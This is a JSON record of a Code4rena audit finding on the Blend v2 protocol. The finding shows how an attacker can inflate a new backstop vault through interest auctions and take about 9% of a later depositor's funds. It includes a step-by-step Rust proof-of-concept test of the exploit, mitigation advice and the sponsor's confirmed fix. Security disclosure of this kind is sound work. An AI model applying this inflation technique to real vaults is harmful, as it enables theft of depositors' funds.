{
    "id": 62081,
    "kind": "GIT",
    "auditfirm_id": 2,
    "impact": "MEDIUM",
    "finders_count": 2,
    "protocol_id": 2159,
    "title": "[M-18] Interest auctions enable inflation attacks on backstop vaults, allowing attackers to steal user deposits",
    "content": "\n\nAn attacker can exploit the interest auction mechanism in a newly created backstop vault to indirectly donate tokens, thereby manipulating the exchange rate between backstop tokens and vault shares. This manipulation can cause rounding errors in future users’ deposits, enabling the attacker to steal a portion of the deposited funds.\n\n### Finding description\n\nInflation attacks are a well-known threat to tokenized vaults. In this type of attack, an attacker donates tokens directly to a vault, increasing the vault’s total underlying tokens. This manipulation distorts the exchange rate between tokens and shares, allowing the attacker to exploit rounding issues and steal funds from future deposits.\n\nBackstop vaults maintain an internal accounting of their underlying tokens, so direct token transfers do not pose a risk in this codebase. However, when filling interest auctions, the pool calls the backstop’s [`donate()`](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/contract.rs# L317-L325) method. This increases the internally accounted tokens of the backstop without increasing its shares, allowing an attacker to indirectly donate to the pool through interest auctions. As a result, an attacker can directly transfer tokens to a pool to falsely simulate significant interest accrual. They can then create and fill a new interest auction, using the donated funds to inflate the vault and carry out the attack. (See the PoC section below.)\n\nNote that during deposits, the backstop’s [`execute_deposit`](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/backstop/deposit.rs# L8-L33) function checks whether the number of minted shares is zero and reverts the transaction in such cases. This prevents the worst-case scenario where an inflation attack could cause depositors to lose their entire deposit. **However, it does not protect against less severe cases of the attack.** Deposits larger than the donation amount will result in a nonzero number of minted shares, bypassing this check. But due to rounding errors, a substantial portion of these deposits can still be stolen by the attacker. See the PoC section below for a coded scenario demonstrating how an attacker can steal 9% from the following user deposit.\n\n### Proof of Concept\n\nConsider the following series of steps:\n\n1. The attacker deposits 4 backstop tokens into a newly created backstop. **Backstop state:** (tokens: 4, shares: 4)\n2. The attacker transfers `10_000 * SCALAR_7` XLM directly to the pool associated with the backstop vault.\n3. The attacker calls the pool’s `gulp()` method, which assigns the amount deposited in step 1 to `reserve.data.backstop_credit`.\n4. The attacker initiates an interest auction on the backstop, leveraging the inflated `reserve.data.backstop_credit` due to step 2.\n5. The attacker waits for one ledger.\n6. The attacker fills the auction. **Backstop state:** (tokens: `960_000_0004`, shares: 4)\n7. A user deposits `1200 * SCALAR_7` backstop tokens into the backstop.\n8. The attacker queues for withdrawal.\n9. The attacker withdraws all of his shares, leaving with a fraction of the user’s deposit as profit.\n\n**Attacker Profit:** `119_999_9998`\n**User Loss:** `119_999_9998` (9% of the initial deposit)\n\nRun the test code below for the above exemplified scenario (Copy the file contents below to a file in `blend-contracts-v2/test-suites/tests`):\n```\n\n#![cfg(test)]\nuse pool::{Request, RequestType};\nuse soroban_sdk::{testutils::Address as _, vec, Address, String};\nuse test_suites::{\n    pool::default_reserve_metadata,\n    test_fixture::{TestFixture, TokenIndex, SCALAR_7},\n};\n\n#[test]\nfn test_inflation_attack() {\n    // START OF SETUP //\n    let mut fixture = TestFixture::create(false);\n    let whale = Address::generate(&fixture.env);\n    let sauron = Address::generate(&fixture.env);\n    let pippen = Address::generate(&fixture.env);\n    // create pool with 1 new reserve\n    fixture.create_pool(String::from_str(&fixture.env, \"Teapot\"), 0, 6, 0);\n    let xlm_config = default_reserve_metadata();\n    fixture.create_pool_reserve(0, TokenIndex::XLM, &xlm_config);\n    let pool_address = fixture.pools[0].pool.address.clone();\n    // setup backstop and update pool status\n    fixture.tokens[TokenIndex::BLND].mint(&whale, &(5_001_000 * SCALAR_7));\n    fixture.tokens[TokenIndex::USDC].mint(&whale, &(121_000 * SCALAR_7));\n    fixture.lp.join_pool(\n        &(400_000 * SCALAR_7),\n        &vec![&fixture.env, 5_001_000 * SCALAR_7, 121_000 * SCALAR_7],\n        &whale,\n    );\n    let starting_balance = 200_000 * SCALAR_7;\n    fixture.lp.transfer(&whale, &sauron, &starting_balance);\n    fixture.lp.transfer(&whale, &pippen, &starting_balance);\n\n    fixture.tokens[TokenIndex::XLM].mint(&sauron, &starting_balance);\n    // END OF SETUP //\n\n    let initial_backstop_state = fixture.backstop.pool_data(&pool_address);\n    // Assert that backstop has no deposits\n    assert_eq!(initial_backstop_state.tokens, 0);\n\n    // 1. Attacker deposits a small amount as the initial depositor.\n    let sauron_deposit_amount = 4;\n    let sauron_shares = fixture\n        .backstop\n        .deposit(&sauron, &pool_address, &sauron_deposit_amount);\n\n    // 2. Attacker transfer 10_000 * SCALAR_7 XLM to the pool.\n    let amount = 10_000 * SCALAR_7;\n    fixture.tokens[TokenIndex::XLM].transfer(&sauron, &pool_address, &amount);\n\n    let pool = &fixture.pools[0].pool;\n    // 3. Attacker calls gulp() to send amounts sent to reserve.data.backstop_credit\n    pool.gulp(&fixture.tokens[TokenIndex::XLM].address);\n\n    // 4. Attacker initiates new interest auction.\n    pool.new_auction(\n        &2u32,\n        &fixture.backstop.address,\n        &vec![&fixture.env, fixture.lp.address.clone()],\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::XLM].address.clone(),\n        ],\n        &100u32,\n    );\n\n    // 5. Attacker waits for one ledger\n    fixture.jump_with_sequence(5);\n\n    // 6. Attacker fills the interest auction\n    fixture.lp.approve(\n        &sauron,\n        &fixture.backstop.address,\n        &starting_balance,\n        &fixture.env.ledger().sequence(),\n    );\n    let fill_requests = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::FillInterestAuction as u32,\n            address: fixture.backstop.address.clone(), //address shouldn't matter\n            amount: 100,\n        },\n    ];\n    pool.submit(&sauron, &sauron, &sauron, &fill_requests);\n\n    // Assert that donation went to the backstop vault.\n    let backstop_state_after_donation = fixture.backstop.pool_data(&pool_address);\n    let sauron_donation = 960 * SCALAR_7;\n    assert_eq!(backstop_state_after_donation.tokens, sauron_donation + sauron_deposit_amount);\n\n    // 7. User deposits 1200 * SCALAR_7 in the backstop vault.\n    let pippen_deposit_amount = 1200 * SCALAR_7;\n    let pippen_shares = fixture\n        .backstop\n        .deposit(&pippen, &pool_address, &pippen_deposit_amount);\n    // Assert that pippen received shares\n    assert!(pippen_shares > 0);\n\n    // 8. Attacker queues for withdrawal.\n    fixture.backstop.queue_withdrawal(&sauron, &pool_address, &sauron_shares);\n    fixture.backstop.queue_withdrawal(&pippen, &pool_address, &pippen_shares);\n    // Wait withdrawal queue deadline\n    fixture.jump_with_sequence(86400 * 17);\n\n    // 9. Attacker withdraws all of his shares\n    let sauron_withdrawn_amount = fixture.backstop.withdraw(&sauron, &pool_address, &sauron_shares);\n    let sauron_profit = sauron_withdrawn_amount - (sauron_donation + sauron_deposit_amount);\n    // Assert that attacker profited from the attack\n    assert!(sauron_profit > 0);\n    assert_eq!(sauron_profit, 1199999998);\n\n    // User withdraw his shares\n    let pippen_withdrawn_amount = fixture.backstop.withdraw(&pippen, &pool_address, &pippen_shares);\n    let pippen_loss = pippen_withdrawn_amount - pippen_deposit_amount;\n    // Asset that pippen withdraw less tokens than deposited\n    assert!(pippen_loss < 0);\n\n    // Sauron profit equals Pippen loss\n    assert_eq!(sauron_profit, -pippen_loss);\n\n    // Pippen lost aprox. 9% of his initial deposit\n    let pippen_loss_percentage = (-pippen_loss * 100)/pippen_deposit_amount;\n    assert_eq!(pippen_loss_percentage, 9)\n}\n```\n\n### Recommended mitigation steps\n\nThere are multiple ways to mitigate this issue. In general, the backstop could either burn shares during its initialization or use virtual shares. [Both approaches would significantly increase the cost of the attack for an attacker](https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks).\n\nFor a more targeted solution within this codebase, a restriction could be implemented to allow interest auctions to be filled only when the backstop vault already has a significant portion of shares minted. This would prevent the attack described above by ensuring that an attacker cannot exploit a newly created backstop with minimal shares.\n\n**[mootz12 (Script3) confirmed and commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-16?commentParent=p3ekjgSX8BH):**\n\n> Validated this is a finding.\n>\n> Inflation attacks are harder to pull off repeatedly in the backstop, given the withdraw queue period, and this is also mitigated slightly with prevention of zero mint scenarios.\n\n**[Blend mitigated](https://github.com/code-423n4/2025-04-blend-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**\n\n> [PR 48](https://github.com/blend-capital/blend-contracts-v2/pull/48).\n\n**Status:** Mitigation confirmed. Full details in reports from [0xAlix2](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-17), [oakcobalt](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-22), [Testerbot](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-69) and [rscodes](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-54).\n\n*Code4rena judging staff adjusted the severity of finding [M-18], after reviewing additional context provided by the sponsor.*\n\n---\n\n",
    "summary": "\nReport Summary:\n\nThe report describes a bug in a codebase that could allow an attacker to manipulate the exchange rate between backstop tokens and vault shares, resulting in rounding errors that could lead to stolen funds. The bug is caused by a flaw in the interest auction mechanism, which allows an attacker to indirectly donate tokens to the backstop vault and inflate its value. While the codebase has some checks in place to prevent the worst-case scenario, it is still vulnerable to less severe attacks due to rounding errors. The report recommends implementing a restriction on interest auctions to prevent this type of attack. The sponsor has confirmed the finding and implemented a mitigation. ",
    "report_date": "2025-08-13T00:00:00.000Z",
    "contest_prize_txt": "125000",
    "contest_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
    "sponsor_name": "Blend",
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
    "github_link": "https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-16",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "492",
    "slug": "m-18-interest-auctions-enable-inflation-attacks-on-backstop-vaults-allowing-attackers-to-steal-user-deposits-code4rena-blend-blend-git",
    "firm_name": "Code4rena",
    "firm_logo_square": "code4rena_square.png",
    "protocol_name": "Blend",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Tricko"
            }
        },
        {
            "wardens_warden": {
                "handle": "monrel"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
    },
    "protocols_protocol": {
        "name": "Blend",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}